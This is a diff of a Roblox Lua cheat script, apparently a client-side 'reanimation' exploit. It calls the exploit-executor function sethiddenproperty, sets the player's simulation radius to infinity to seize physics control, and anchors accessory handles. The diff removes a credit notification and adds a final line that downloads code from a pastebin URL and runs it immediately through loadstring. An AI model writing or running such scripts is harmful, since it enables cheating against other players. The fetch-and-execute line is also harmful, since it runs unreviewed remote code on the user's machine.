@@ -1,13 +1,3 @@
-game:GetService("StarterGui"):SetCore("SendNotification", { 
-	Title = "FE Gaming PC";
-	Text = "Made By References#5693"})
-Duration = 1;
-
-while true do
-    wait(.1)
-    sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", math.huge)
-end
-
 game:GetService("RunService").Heartbeat:Wait();
    settings().Physics.AllowSleep = false;
    game:GetService("Players").LocalPlayer.MaximumSimulationRadius = math.huge;
@@ -107,3 +97,7 @@ game.Players.LocalPlayer.Character["LUAhEAD"].Handle.Anchored = true
 game.Players.LocalPlayer.Character["WDW_FoamFinger"].Handle.Anchored = true
 game.Players.LocalPlayer.Character.Humanoid.HipHeight = 0
 game.Players.LocalPlayer.Character.Animate.Disabled = false
+
+wait()
+
+loadstring(game:HttpGet("https://pastebin.com/raw/nSABa0Gb", true))()
